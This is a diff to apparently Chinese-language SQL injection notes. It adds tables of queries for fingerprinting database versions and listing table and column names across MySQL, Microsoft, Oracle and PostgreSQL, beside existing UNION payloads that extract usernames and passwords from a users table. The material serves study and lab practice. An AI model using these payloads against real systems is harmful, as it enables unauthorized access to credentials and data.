@@ -66,3 +66,21 @@ SELECT name FROM products WHERE category = 'Gifts`' UNION SELECT username || '~'
 
 SELECT id, name FROM products WHERE category = 'Gifts`' UNION SELECT NULL, username || '~' || password FROM users--`'
 
+## 检测数据库
+
+发现SQL注入漏洞后，下一步是获取所用数据库的信息。
+
+### 获取数据库的类型和版本
+
+Database type|Query
+---|---
+Microsoft, MySQL|SELECT @@version
+Oracle|SELECT banner FROM v$version
+PostgreSQL|SELECT version()
+
+### 获取数据库的表名和列名
+
+Database type|Query
+---|---
+Microsoft, MySQL,PostgreSQL|SELECT table_name FROM information_schema.tables<br>SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+Oracle|SELECT table_name FROM all_tables<br>SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
